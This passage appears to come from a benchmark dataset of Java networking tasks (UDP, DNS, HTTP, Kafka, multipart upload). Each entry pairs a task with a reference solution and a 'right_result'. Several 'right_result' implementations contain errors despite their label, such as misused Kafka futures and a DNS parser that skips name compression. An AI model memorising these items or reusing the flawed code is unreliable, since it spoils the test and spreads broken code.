request;\n    }\n\n    private void handleTrackerAnnounceResponse(ByteBuffer message, boolean inhibitEvents, String hexInfoHash) {\n        TrackerMessage trackerMessage = TrackerMessage.deserialize(message);\n        validateTrackerResponse(trackerMessage);\n        handleTrackerConnectResponse(trackerMessage);\n    }\n\n    private void validateTrackerResponse(TrackerMessage message) {\n        if (message == null || message.getLength() < 12) {\n            throw new IllegalArgumentException(\"Invalid tracker response\");\n        }\n    }\n\n    private void handleTrackerConnectResponse(TrackerMessage message) {\n        if (message.getType() == TrackerMessage.Type.CONNECT) {\n            connectionExpiration = new Date(System.currentTimeMillis() + 300000);\n        }\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n    private void send(ByteBuffer data) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data.array(), data.remaining(), address);\n        socket.send(packet);\n    }\n\n    private ByteBuffer recv(int attempt) throws IOException {\n        long startTime = System.currentTimeMillis();\n        while (true) {\n            try {\n                ByteBuffer buffer = ByteBuffer.allocate(UDP_PACKET_LENGTH);\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.capacity());\n                socket.receive(packet);\n                if (System.currentTimeMillis() - startTime > UDP_BASE_TIMEOUT_SECONDS * 1000) {\n                    throw new TimeoutException(\"Timeout exceeded\");\n                }\n                return buffer;\n            } catch (IOException e) {\n                if (attempt < UDP_MAX_TRIES && !stop) {\n                    logger.info(\"Retrying receive... Attempt: \" + attempt);\n                    continue;\n                } else {\n                    throw e;\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 612,
    "Instruction": "Task Description: Create a UDP server class in Java that can send messages to a specified target host and port using UDP protocol.\n\nClass Description: The UDPServer class implements a simple UDP server that can send messages to other hosts. It encapsulates the Java DatagramSocket functionality for UDP communication.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- port: int - The port number the server is bound to\n\nMethods:\n- UDPServer(int port) -> void - Constructor that creates a DatagramSocket bound to the specified port\n- send(String message, String targetHost, int targetPort) -> void - Sends a message to the specified target host and port using UDP\n- close() -> void - Closes the UDP socket and releases system resources",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPServer {\n\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) throws Exception {\n        this.port = port;\n        this.socket = new DatagramSocket(port);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        DatagramPacket packet = new DatagramPacket(\n            message.getBytes(),\n            message.length(),\n            InetAddress.getByName(targetHost),\n            targetPort\n        );\n        socket.send(packet);\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class UDPServer {\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) throws IOException {\n        this.port = port;\n        socket = new DatagramSocket(port);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws IOException {\n        byte[] data = message.getBytes(StandardCharsets.UTF_8);\n        InetAddress address = InetAddress.getByName(targetHost);\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, targetPort);\n        socket.send(packet);\n    }\n\n    public void close() throws IOException {\n        socket.close();\n    }\n}"
  },
  {
    "Task_id": 615,
    "Instruction": "Task Description: Implement a DNS UDP client class that can resolve DNS queries (A records and TXT records) by communicating with DNS servers over UDP.\n\nClass Description: The DnsUdpClient class provides functionality to send DNS queries to specified DNS servers and process the responses. It supports resolving domain names to IPv4 addresses (A records) and retrieving text records (TXT records).\n\nAttributes:\nDNS_SERVERS: InetSocketAddress[] - An array of predefined DNS server addresses with their respective ports\n\nMethods:\nresolveAOverUdp: resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) -> List<Inet4Address> - Resolves a DNS A record query by sending it to the specified DNS server and returns a list of IPv4 addresses. Throws Exception if the operation fails.\n\ntoIps: toIps(byte[] buffer) -> List<Inet4Address> - Helper method that converts DNS response data into a list of IPv4 addresses by parsing A records.\n\nresolveTXTOverUdp: resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) -> String - Resolves a DNS TXT record query by sending it to the specified DNS server and returns the text content. Throws Exception if the operation fails.\n\ntoTXT: toTXT(byte[] buffer) -> String - Helper method that extracts TXT record data from DNS response and returns it as a string. Throws RuntimeException if no TXT record is found.",
    "Canonical_solution": "import net.sf.ivmaidns.dns.DNSConnection;\nimport net.sf.ivmaidns.dns.DNSMsgHeader;\nimport net.sf.ivmaidns.dns.DNSName;\nimport net.sf.ivmaidns.dns.DNSRecord;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private final static InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[]{\n            new InetSocketAddress(\"8.8.8.8\", 53),\n            new InetSocketAddress(\"208.67.222.222\", 443),\n            new InetSocketAddress(\"208.67.220.220\", 443),\n            new InetSocketAddress(\"199.91.73.222\", 3389),\n            new InetSocketAddress(\"87.118.100.175\", 110),\n            new InetSocketAddress(\"87.118.85.241\", 110),\n            new InetSocketAddress(\"77.109.139.29\", 110),\n            new InetSocketAddress(\"77.109.138.45\", 110)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(1000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toIps(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        List<Inet4Address> ips = new ArrayList<Inet4Address>();\n        for (DNSRecord record : records) {\n            if (DNSRecord.A == record.getRType()) {\n                if (record.getRData().length > 0) {\n                    ips.add((Inet4Address) record.getRData()[0]);\n                }\n            }\n        }\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(2000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toTXT(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private String toTXT(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        for (DNSRecord record : records) {\n            if (DNSRecord.TXT == record.getRType() && record.getRData().length > 0) {\n                return (String) record.getRData()[0];\n            }\n        }\n        throw new RuntimeException(\"not found\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.MulticastSocket;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.nio.charset.StandardCharsets;\n\npublic class DnsUdpClient {\n    private InetSocketAddress[] DNS_SERVERS;\n\n    public DnsUdpClient(InetSocketAddress[] dnsServers) {\n        this.DNS_SERVERS = dnsServers;\n    }\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket outPacket = new DatagramPacket(query, query.length, dnsServer);\n        socket.send(outPacket);\n\n        byte[] buffer = new byte[1500];\n        DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);\n        socket.receive(inPacket);\n\n        return toIps(inPacket.getData());\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        List<Inet4Address> ips = new ArrayList<>();\n        int offset = 0;\n\n        short id = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n        short flags = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n        short qdcount = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n        short ancount = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n\n        for (int i = 0; i < qdcount; i++) {\n            while (offset < buffer.length && buffer[offset] != 0) {\n                offset += 1 + buffer[offset++];\n            }\n            offset++;\n            offset += 4;\n        }\n\n        for (int i = 0; i < ancount; i++) {\n            while (offset < buffer.length && buffer[offset] != 0) {\n                offset += 1 + buffer[offset++];\n            }\n            offset++;\n\n            short type = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n            if (type != 1) continue;\n\n            short classCode = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n\n            int ttl = (buffer[offset++] & 0xFF) << 24 | (buffer[offset++] & 0xFF) << 16 | (buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF);\n\n            short dataLength = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n\n            if (dataLength == 4) {\n                byte[] ipBytes = new byte[4];\n                for (int j = 0; j < 4; j++) {\n                    ipBytes[j] = buffer[offset++];\n                }\n                try {\n                    InetAddress inet = InetAddress.getByAddress(ipBytes);\n                    ips.add((Inet4Address) inet);\n                } catch (Exception e) {\n                }\n            }\n        }\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket outPacket = new DatagramPacket(query, query.length, dnsServer);\n        socket.send(outPacket);\n\n        byte[] buffer = new byte[1500];\n        DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);\n        socket.receive(inPacket);\n\n        return toTXT(inPacket.getData());\n    }\n\n    private String toTXT(byte[] buffer) {\n        int offset = 0;\n\n        short id = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n        short flags = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n        short qdcount = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n        short ancount = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n\n        for (int i = 0; i < qdcount; i++) {\n            while (offset < buffer.length && buffer[offset] != 0) {\n                offset += 1 + buffer[offset++];\n            }\n            offset++;\n            offset += 4;\n        }\n\n        for (int i = 0; i < ancount; i++) {\n            while (offset < buffer.length && buffer[offset] != 0) {\n                offset += 1 + buffer[offset++];\n            }\n            offset++;\n\n            short type = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n            if (type != 16) continue;\n\n            short classCode = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n\n            int ttl = (buffer[offset++] & 0xFF) << 24 | (buffer[offset++] & 0xFF) << 16 | (buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF);\n\n            short dataLength = (short) ((buffer[offset++] & 0xFF) << 8 | (buffer[offset++] & 0xFF));\n\n            if (dataLength > 0) {\n                byte[] txtData = new byte[dataLength];\n                for (int j = 0; j < dataLength; j++) {\n                    txtData[j] = buffer[offset++];\n                }\n                return new String(txtData, StandardCharsets.UTF_8);\n            }\n        }\n        throw new RuntimeException(\"No TXT record found\");\n    }\n}"
  },
  {
    "Task_id": 88,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests and handling responses, including JSON parsing and connection management.\n\nClass Description: HttpRequester is a utility class that provides methods for creating HTTP connections, sending requests, and processing responses. It supports handling both successful responses and error streams, with specialized methods for parsing JSON responses. The class manages connection lifecycle and resource cleanup.\n\nAttributes: (None - this is a purely static utility class)\n\nMethods:\n\nMethod1: getConnectionFromRoute(String apiUrl, Route route, String... params) -> HttpURLConnection - Creates an HTTP connection from a route template and parameters. Sets up the connection with proper headers and request method.\n\nMethod2: getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) -> HttpURLConnection - Creates an HTTP connection from a pre-compiled route. Configures the connection with headers and request method.\n\nMethod3: parseInputStreamAndClose(InputStream inputStream) -> String - Internal method that reads an input stream into a string and closes the stream.\n\nMethod4: parseString(HttpURLConnection connection) -> String - Reads the successful response from a connection into a string.\n\nMethod5: parseStringAndDisconnect(HttpURLConnection connection) -> String - Reads the response into a string and disconnects the connection.\n\nMethod6: parseErrorString(HttpURLConnection connection) -> String - Reads the error stream from a connection into a string.\n\nMethod7: parseErrorStringAndDisconnect(HttpURLConnection connection) -> String - Reads the error stream into a string and disconnects the connection.\n\nMethod8: parseJSONObject(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object.\n\nMethod9: parseJSONObjectAndDisconnect(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object and disconnects the connection.\n\nMethod10: parseJSONArray(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array.\n\nMethod11: parseJSONArrayAndDisconnect(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array and disconnects the connection.",
    "Canonical_solution": "import org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequester {\n\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        return getConnectionFromCompiledRoute(apiUrl, route.compile(params));\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        String url = apiUrl + route.getCompiledRoute();\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setFixedLengthStreamingMode(0);\n        connection.setRequestMethod(route.getMethod().name());\n        String agentString = System.getProperty(\"http.agent\")\n                + \"; ReVanced/\" + Utils.getAppVersionName()\n                + \" (\" + Utils.getPatchesReleaseVersion() + \")\";\n        connection.setRequestProperty(\"User-Agent\", agentString);\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            StringBuilder jsonBuilder = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                jsonBuilder.append(line);\n                jsonBuilder.append('\\n');\n            }\n            return jsonBuilder.toString();\n        }\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getInputStream());\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        InputStream errorStream = connection.getErrorStream();\n        if (errorStream == null) {\n            return \"\";\n        }\n        return parseInputStreamAndClose(errorStream);\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONObject(parseString(connection));\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONObject object = parseJSONObject(connection);\n        connection.disconnect();\n        return object;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONArray(parseString(connection));\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONArray array = parseJSONArray(connection);\n        connection.disconnect();\n        return array;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport org.json.*;\n\npublic class HttpRequester {\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        Route.CompiledRoute compiledRoute = route.compile(params);\n        String urlStr = compiledRoute.getUrl();\n        URL url = new URL(urlStr);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setDoOutput(false);\n        connection.setRequestProperty(\"Accept\", \"application/json\");\n        return connection;\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        String urlStr = route.getUrl();\n        URL url = new URL(urlStr);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setDoOutput(false);\n        connection.setRequestProperty(\"Accept\", \"application/json\");\n        return connection;\n    }\n\n    public static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        if (inputStream == null) return \"\";\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        if (connection == null) return \"\";\n        try {\n            return parseInputStreamAndClose(connection.getInputStream());\n        } catch (IOException e) {\n            return parseErrorString(connection);\n        }\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        if (connection == null) return \"\";\n        try {\n            return parseInputStreamAndClose(connection.getErrorStream());\n        } catch (IOException e) {\n            return \"\";\n        }\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws IOException {\n        String json = parseString(connection);\n        return new JSONObject(json);\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws IOException {\n        JSONObject json = parseJSONObject(connection);\n        connection.disconnect();\n        return json;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws IOException {\n        String json = parseString(connection);\n        return new JSONArray(json);\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws IOException {\n        JSONArray json = parseJSONArray(connection);\n        connection.disconnect();\n        return json;\n    }\n}"
  },
  {
    "Task_id": 9,
    "Instruction": "Task Description: Create a Java class that provides functionality for managing Kafka topics using the Kafka AdminClient API. The class should be able to create and configure an AdminClient instance and use it to create new Kafka topics.\n\nClass Description: The KafkaTopicManager class encapsulates operations for interacting with Kafka topics through the AdminClient API. It provides methods to initialize an AdminClient connection and create new topics with specified configurations.\n\nAttributes:\n- adminClient: AdminClient - The Kafka AdminClient instance used for topic management operations\n\nMethods:\n- createAndConfigureAdminClient(String bootstrapServers) -> AdminClient - Creates and configures a Kafka AdminClient instance with the specified bootstrap servers\n- autoCreateMetricsTopic(AdminClient adminClient, String topicName) -> TopicDescription - Creates a new Kafka topic with default configuration (1 partition and replication factor of 1) and returns its description",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.CreateTopicsResult;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport java.util.Collections;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\n\npublic AdminClient createAndConfigureAdminClient(String bootstrapServers) {\n    Properties adminProps = new Properties();\n    adminProps.setProperty(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminProps);\n    return adminClient;\n}\n\npublic TopicDescription autoCreateMetricsTopic(AdminClient adminClient, String topicName) throws ExecutionException, InterruptedException {\n    NewTopic testTopic = new NewTopic(topicName, 1, (short) 1);\n    CreateTopicsResult createTopicsResult = adminClient.createTopics(Collections.singleton(testTopic));\n    createTopicsResult.all().get();\n    TopicDescription topicDescription = adminClient.describeTopics(Collections.singleton(topicName)).values().get(topicName).get();\n    return topicDescription;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 33,
    "right_result": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport java.util.Collections;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.CompletableFuture;\n\npublic class KafkaTopicManager {\n    private AdminClient adminClient;\n\n    public AdminClient createAndConfigureAdminClient(String bootstrapServers) {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", bootstrapServers);\n        this.adminClient = AdminClient.create(props);\n        return this.adminClient;\n    }\n\n    public TopicDescription autoCreateMetricsTopic(AdminClient adminClient, String topicName) {\n        NewTopic newTopic = new NewTopic(topicName, 1, 1);\n        adminClient.createTopics(Collections.singletonList(newTopic)).get();\n        Map<String, TopicDescription> descriptions = adminClient.describeTopics(Collections.singletonList(topicName)).get();\n        return descriptions.get(topicName);\n    }\n}"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Create a utility class for handling HTTP POST requests with multipart form data, including both text fields and file uploads, using Java's HttpURLConnection.\n\nClass Description: HttpPostUploadUtil is a utility class designed to simplify the process of sending HTTP POST requests with multipart/form-data content type. It handles both text parameters and file uploads, manages connection timeouts, and properly formats the multipart request body.\n\nAttributes:\n- logger: Logger - Used for logging errors and debug information\n- BOUNDARY: String - A constant string used as the boundary for multipart form data (defined within the method)\n\nMethods:\n- formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) -> String - Performs an HTTP POST request with multipart form data containing both text parameters and files\n  Input:\n    - urlStr: String - The target URL for the POST request\n    - connectTimeout: int - Connection timeout in milliseconds\n    - readTimeout: int - Read timeout in milliseconds\n    - textMap: Map<String, String> - Key-value pairs for text form fields\n    - fileMap: Map<String, MultipartFile> - Key-value pairs for file uploads (key is field name, value is file data)\n  Output:\n    - String - The response body from the server\n\n- closeStream(Closeable closeable) -> void - Helper method to safely close Closeable resources\n  Input:\n    - closeable: Closeable - The resource to be closed\n  Output: None",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.multipart.MultipartFile;\nimport java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.util.Iterator;\nimport java.util.Map;\n\npublic class HttpPostUploadUtil {\n\n    private static final Logger logger = LoggerFactory.getLogger(HttpPostUploadUtil.class);\n\n    public static String formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) throws Exception {\n        String res = \"\";\n        HttpURLConnection conn = null;\n        OutputStream out = null;\n        BufferedReader reader = null;\n        String BOUNDARY = \"---------------------------123821742118716\";\n        try {\n            URL url = new URL(urlStr);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setConnectTimeout(connectTimeout);\n            conn.setReadTimeout(readTimeout);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setUseCaches(false);\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.6)\");\n            conn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + BOUNDARY);\n\n            out = new DataOutputStream(conn.getOutputStream());\n            if (null != textMap) {\n                StringBuffer strBuf = new StringBuffer();\n                Iterator<Map.Entry<String, String>> iter = textMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, String> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    String inputValue = (String) entry.getValue();\n                    if (inputValue == null) {\n                        continue;\n                    }\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"\\r\\n\\r\\n\");\n                    strBuf.append(inputValue);\n                }\n                out.write(strBuf.toString().getBytes());\n            }\n\n            if (null != fileMap) {\n                Iterator<Map.Entry<String, MultipartFile>> iter = fileMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, MultipartFile> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    MultipartFile multipartFile = (MultipartFile) entry.getValue();\n                    if (multipartFile == null) {\n                        continue;\n                    }\n                    String fileName = multipartFile.getOriginalFilename();\n                    String contentType = multipartFile.getContentType();\n\n                    StringBuffer strBuf = new StringBuffer();\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\");\n                    strBuf.append(\"Content-Type:\" + contentType + \"\\r\\n\\r\\n\");\n\n                    out.write(strBuf.toString().getBytes());\n\n                    DataInputStream in = new DataInputStream(multipartFile.getInputStream());\n                    int bytes = 0;\n                    byte[] bufferOut = new byte[1024];\n                    while ((bytes = in.read(bufferOut)) != -1) {\n                        out.write(bufferOut, 0, bytes);\n                    }\n                    in.close();\n                }\n            }\n\n            byte[] endData = (\"\\r\\n--\" + BOUNDARY + \"--\\r\\n\").getBytes();\n            out.write(endData);\n            out.flush();\n\n            StringBuffer strBuf = new StringBuffer();\n            reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line = null;\n            while ((line = reader.readLine()) != null) {\n                strBuf.append(line).append(\"\\n\");\n            }\n            res = strBuf.toString();\n        } catch (ProtocolException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>ProtocolException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (MalformedURLException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>MalformedURLException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (IOException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>IOException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } finally {\n            closeStream(out);\n            closeStream(reader);\n            if (null != conn) {\n                conn.disconnect();\n                conn = null;\n            }\n        }\n        return res;\n    }\n\n    private static void closeStream(Closeable closeable){\n        try {\n            if (null != closeable) {\n                closeable.close();\n                closeable = null;\n            }\n        }catch (IOException e) {\n            logger.error(\"\u5173\u95ed\u8d44\u6e90\u51fa\u9519\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "import java.io.*;\nimport java.net.URL;\nimport java.util.Map;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.springframework.web.multipart.MultipartFile;\nimport java.nio.charset.StandardCharsets;\n\npublic class HttpPostUploadUtil {\n    private static final Log logger = LogFactory.getLog(HttpPostUploadUtil.class);\n\n    public String formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) throws IOException {\n        URL url = new URL(urlStr);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setConnectTimeout(connectTimeout);\n        connection.setReadTimeout(readTimeout);\n        connection.setDoOutput(true);\n        String boundary = generateBoundary();\n        connection.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n\n        try (DataOutputStream dos = new DataOutputStream(connection.getOutputStream())) {\n            for (Map.Entry<String, String> textEntry : textMap.entrySet()) {\n                String fieldName = textEntry.getKey();\n                String fieldValue = textEntry.getValue();\n                byte[] textContent = fieldValue.getBytes(StandardCharsets.UTF_8);\n                writePart(dos, boundary, fieldName, null, textContent);\n            }\n            for (Map.Entry<String, MultipartFile> fileEntry : fileMap.entrySet()) {\n                String fieldName = fileEntry.getKey();\n                MultipartFile file = fileEntry.getValue();\n                String fileName = file.getOriginalFilename();\n                byte[] fileContent = file.getBytes();\n                writePart(dos, boundary, fieldName, fileName, fileContent);\n            }\n            dos.flush();\n            int responseCode = connection.getResponseCode();\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        } catch (IOException e) {\n            logger.error(\"Error during HTTP POST request: \", e);\n            throw e;\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    private String generateBoundary() {\n        return \"----_Boundary_\" + System.currentTimeMillis();\n    }\n\n    private void writePart(DataOutputStream dos, String boundary, String fieldName, String fileName, byte[] content) throws IOException {\n        dos.writeBytes(\"--\" + boundary + \"\\r\\n\");\n        dos.writeBytes(\"Content-Disposition: form-data; name=\\\"\" + fieldName + \"\\\"\\r\\n\");\n        if (fileName != null) {\n            